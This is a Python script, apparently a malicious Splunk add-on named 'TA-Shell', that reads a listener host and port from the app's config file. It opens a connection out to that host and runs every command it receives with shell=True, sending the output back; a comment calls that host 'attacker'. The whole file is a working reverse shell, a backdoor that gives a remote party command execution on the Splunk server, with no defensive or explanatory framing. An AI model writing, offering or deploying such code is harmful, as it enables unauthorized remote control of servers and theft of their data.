#!/usr/local/bin/python3
import socket,subprocess
import configparser
import os

#load configuration file
Config = configparser.ConfigParser()
Config.read(os.environ['SPLUNK_HOME']+"/etc/apps/TA-Shell/etc/shell.conf")


#config function
def ConfigSectionMap(section):
    dict1 = {}
    options = Config.options(section)
    for option in options:
        try:
            dict1[option] = Config.get(section, option)
            if dict1[option] == -1:
                DebugPrint("skip: %s" % option)
        except configparser.Error as exception:
            print("exception on %s!" % option)
            dict1[option] = None
    return dict1


HOST = ConfigSectionMap("global")['lhost']
PORT = ConfigSectionMap("global")['lport']


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connect to listening machine
s.connect((HOST, int(PORT)))
# send we are connected
s.send(b'[*] Connection Established!\n')
# start loop
while 1:
     # recieve shell command
     data = s.recv(1024)
     # if its quit, then break out and close socket
     if data == "quit": break
     # do shell command
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     # read output
     stdout_value = proc.stdout.read() + proc.stderr.read()
     # send output to attacker
     s.send(stdout_value)
# close socket
s.close()
